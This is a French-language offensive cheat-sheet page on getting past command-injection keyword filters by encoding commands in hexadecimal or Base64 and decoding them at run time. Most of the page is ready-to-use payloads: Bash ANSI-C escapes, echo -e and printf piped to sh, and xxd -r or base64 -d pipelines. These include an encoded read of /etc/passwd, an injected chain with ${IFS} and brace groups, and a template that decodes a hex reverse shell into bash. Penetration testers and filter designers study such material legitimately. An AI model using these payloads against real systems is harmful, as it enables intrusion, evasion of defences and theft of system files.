---
title: "Contournement de filtre d'injection de commande par hexadécimal et décodage à l'exécution"
description: "Transporter une commande sous forme d'hexadécimal ou d'échappements ANSI-C, $'\\x77\\x68\\x6f\\x61\\x6d\\x69', echo -e, xxd -r, et la décoder à l'exécution pour que le mot-clé filtré n'apparaisse jamais littéralement dans la requête."
keywords:
  - injection de commande
  - encodage hexadécimal
  - quoting ANSI-C
  - décodage à l'exécution
  - contournement de filtre
  - xxd
---

# Hexadécimal et décodage à l'exécution

Une liste de blocage recherche le mot-clé littéral dans la requête. Si la commande est transportée sous forme d'**octets encodés** et décodée par le shell uniquement au moment de l'exécution, le mot-clé n'est jamais présent comme littéral que le filtre puisse voir. L'hexadécimal est la forme la plus compacte : le quoting ANSI-C de Bash (`$'\xNN'`) décode les échappements hexadécimaux en ligne, et `echo -e`, `xxd -r` ou `printf` reconstruisent des octets qui sont ensuite acheminés vers un shell.

## Pourquoi le shell le normalise

Le shell décode la séquence d'échappement ou le pipeline **après** que le filtre a inspecté la requête. `$'\x77\x68\x6f\x61\x6d\x69'` est, pour le filtre, la chaîne ASCII `$ ' \ x 7 7 …`, sans adjacence `w`, `h`, `o`, `a`, `m`, `i`, sans sous-chaîne `whoami`. Le quoting ANSI-C de Bash évalue les échappements hexadécimaux en les octets `whoami` seulement lorsque le mot est développé, et le résultat est exécuté. Le mot-clé interdit se matérialise à l'intérieur du shell, au-delà du point où la liste de blocage a regardé.

## Quoting ANSI-C (en ligne, sans binaire externe)

`$'...'` décode les échappements hexadécimaux `\xNN` (et octaux `\NNN`) :

```
$'\x77\x68\x6f\x61\x6d\x69'          # → whoami
$'\x69\x64'                          # → id
$'\x63\x61\x74' /etc/passwd          # → cat /etc/passwd
```

Encodez toute l'invocation et confiez-la à un shell lorsque les arguments sont également filtrés :

```
bash -c $'\x69\x64'                  # run "id"
$'\x2f\x62\x69\x6e\x2f\x69\x64'      # → /bin/id
```

## Décoder et acheminer avec echo -e / printf

`echo -e` interprète les échappements par antislash ; acheminez les octets décodés dans un shell :

```
echo -e '\x77\x68\x6f\x61\x6d\x69' | sh
printf '\x69\x64\x0a' | bash
```

`\x0a` (saut de ligne) termine proprement la commande lors de l'acheminement vers l'interpréteur.

## Décoder et acheminer avec xxd / base64

`xxd -r -p` inverse un dump hexadécimal simple ; `base64 -d` fait l'équivalent en Base64. Les deux maintiennent le mot-clé hors de la requête :

```
echo 77686f616d69 | xxd -r -p | sh          # hex "whoami"
echo 6964 | xxd -r -p | bash                # hex "id"
echo d2hvYW1p | base64 -d | sh              # base64 "whoami"
```

Préparer un payload plus long de la même manière évite d'entasser une commande complète, et ses métacaractères, à travers le paramètre :

```
echo <hex-of-reverse-shell> | xxd -r -p | bash
```

## Combiner avec d'autres astuces

Le décodage à l'exécution se compose avec les techniques sans espace et de séparateurs :

```
127.0.0.1;echo${IFS}6964|xxd${IFS}-r${IFS}-p|sh
{echo,77686f616d69}|{xxd,-r,-p}|sh
```

Chaque mot-clé du pipeline est soit absent (transporté en hexadécimal), soit lui-même découpé par `${IFS}`/groupes d'accolades, de sorte qu'une liste de blocage littérale n'a rien de contigu à faire correspondre.

## Notes opérationnelles

- Le quoting ANSI-C `$'\xNN'` est une fonctionnalité de **Bash/zsh** ; `/bin/sh` (dash) ne le décode pas. `printf '\xNN'`, `xxd` et `base64` sont des binaires externes, confirmez qu'ils sont présents et pas eux-mêmes filtrés.
- Ajoutez un saut de ligne (`\x0a`) lors de l'acheminement vers un interpréteur pour que la commande décodée s'exécute.
- L'hexadécimal évite non seulement le mot-clé mais aussi les caractères gênants (espaces, barres obliques) puisque ces octets sont également encodés.

## Outils

- **[commix](https://github.com/commixproject/commix)** : les modules tamper appliquent des contournements par encodage et obfuscation.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Decoder pour concevoir et encoder des payloads.

## Références

- [PayloadsAllTheThings: Command Injection, Bypass with encoding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [GTFOBins: xxd](https://gtfobins.github.io/gtfobins/xxd/)
- [Bash Reference Manual: ANSI-C Quoting](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html)
